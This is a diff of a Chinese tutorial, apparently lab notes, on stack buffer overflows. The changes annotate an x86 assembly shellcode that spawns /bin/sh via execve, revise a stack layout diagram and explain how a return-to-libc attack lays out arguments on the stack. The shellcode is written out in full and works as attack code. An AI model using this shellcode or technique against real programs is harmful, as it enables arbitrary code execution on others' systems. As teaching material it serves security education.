@@ -26,7 +26,7 @@
 Linux的`execve()`通过寄存器传递参数，由0x80软中断触发`syscall()`调用，过程如下：
 
 1. 内存中存在`null`结尾字符串`"/bin/sh"`
-1. 内存中存在`"/bin/sh"的地址`后加一个`null long word`1. 拷贝`execve`调用编号(`0xb`)到`eax`1. 拷贝`"/bin/sh"的地址`到`ebx`1. 拷贝`"/bin/sh"的地址的地址`到`ecx`1. 拷贝`null long word的地址`到`edx`1. 执行`int $0x80`调用`syscall()`
+1. 内存中存在`"/bin/sh"的地址`后加一个`null long word`1. 拷贝`execve`调用编号(`0xb`)到`eax`1. 拷贝`"/bin/sh"的地址`（`name[0]`）到`ebx`1. 拷贝`"/bin/sh"的地址的地址`（`name`）到`ecx`1. 拷贝`null long word的地址`（`envp`）到`edx`1. 执行`int $0x80`调用`syscall()`
 
 若`execve()`调用失败，程序将继续执行，很可能导致崩溃。为在调用失败后仍然可以正常退出，在`execve()`之后添加`exit(0)`：
 
@@ -55,10 +55,10 @@ low address         <———— stack growth ————              high ad
                       
           +—————————(3)—————————+
           V                     | 
-   [jmp][pop][execve()][exit()][call]["/bin/sh"][sfp][ret][arguments]
-   ^  |                          ^                    |
-   |  +—————————(2)——————————————+                    |
-   +——————————————————————————————————(1)—————————————+  
+   [jmp][pop][execve()][exit()][call]["/bin/sh"][argv][envp][sfp][ret]
+   ^  |                          ^                                 |
+   |  +—————————(2)——————————————+                                 | 
+   +——————————————————————————————————(1)——————————————————————————+  
 
 ```
 
@@ -77,8 +77,8 @@ low address         <———— stack growth ————              high ad
 
 #define STRING  "/bin/sh"               /* 执行命令字符串 */
 #define STRLEN  7                       /* 字符串长度 */
-#define ARGV    (STRLEN+1)              /* execve()参数2相对偏移量 */
-#define ENVP    (ARGV+4)                /* execve()参数3相对偏移量 */
+#define ARGV    (STRLEN+1)              /* execve()参数2相对于string的偏移量 */
+#define ENVP    (ARGV+4)                /* execve()参数3相对于string的偏移量 */
                                         /* argv末尾元素和envp复用同一地址 */
 .globl main                             /* 令符号main对ld和其他程序可见 */
         .type   main, @function         /* 设置符号main的类型为函数 */
@@ -87,17 +87,17 @@ low address         <———— stack growth ————              high ad
         jmp     calladdr                /* 跳转(2)到call */
 
  popladdr:
-        popl    %esi                    /* 将string地址出栈写入esi */
-        movl    %esi,(ARGV)(%esi)       /* 将string地址写入argv */
+        popl    %esi                    /* 将string地址出栈写入esi, l表示32位 */
+        movl    %esi,(ARGV)(%esi)       /* 将string地址写入argv（string+8） */
         xorl    %eax,%eax               /* 获得32位的0 */
-        movb    %al,(STRLEN)(%esi)      /* 将string结尾字节置0 */
-        movl    %eax,(ENVP)(%esi)       /* 将envp置0 */
-                                        /* argv末尾元素和envp复用同一0 */
+        movb    %al,(STRLEN)(%esi)      /* 将string结尾字节置0, %al表示A寄存器16位(%ax)中低8位, b表示字节*/
+        movl    %eax,(ENVP)(%esi)       /* 将envp（string+12）置0（NULL） */
+                                        /* argv末尾元素和envp复用同一0（NULL）*/
         movb    $SYS_execve,%al         /* syscall参数1: syscall编号 */
         movl    %esi,%ebx               /* syscall参数2: string地址 */
         leal    ARGV(%esi),%ecx         /* syscall参数3: argv地址 */
         leal    ENVP(%esi),%edx         /* syscall参数4: envp地址 */
-        int     $0x80                   /* 调用syscall */
+        int     $0x80                   /* 调用syscall, $表示数字 */
 
         xorl    %ebx,%ebx               /* syscall参数2: 0 */
         movl    %ebx,%eax               /* 将eax置0 */
@@ -106,7 +106,7 @@ low address         <———— stack growth ————              high ad
         int     $0x80                   /* 调用syscall */
 
  calladdr:
-        call    popladdr                /* 将下一指令(string)地址入栈后跳转 */
+        call    popladdr                /* 将下一指令(string)地址push入栈后跳转 */
         .ascii  STRING                  /* 将字符串(不追加0)存入连续地址 */
 ```
 
@@ -304,11 +304,16 @@ $2 = {<text variable, no debug info>} 0x40058150 <__GI_exit>
 $2 = (void (*)(int, const char *)) 0x80495ea <http_serve_none>
 ```
 
-
 [](为了执行`system("/bin/sh")`，还需要一个`"/bin/sh"`字符串。有些情况下，该字符串在环境变量`SHELL`的值中，而环境变量在启动进程时已经被作为参数压入栈底，可用`gdb`在栈中搜索，例如`x/1000s $esp`。本例中未载入该环境变量，需在缓冲区中添加。)
 
+当漏洞函数返回时，根据返回地址跳转到libc函数，libc函数从栈中读取参数。
 
-然后，在栈中布置参数为调用做准备。当漏洞函数返回时，根据返回地址跳转到libc函数，libc函数从栈中读取参数。
+1. 当函数返回执行`ret`指令时，`esp`->返回地址(+4)
+- `pop`指令将返回地址写入`eip`，`esp`->(+8)
+- `eip`所指向的`exit()`开始执行，将当前`ebp`入栈，`esp`->(+4)
+- 设定为`esp`为新的`ebp`->(+4)
+- `exit()`结束后的返回地址为`ebp+4`->(+8) （程序退出，因而具体值没有意义）
+- `exit()`参数地址为`ebp+8`->(+12)
 
 ```  
      stack bottom                           
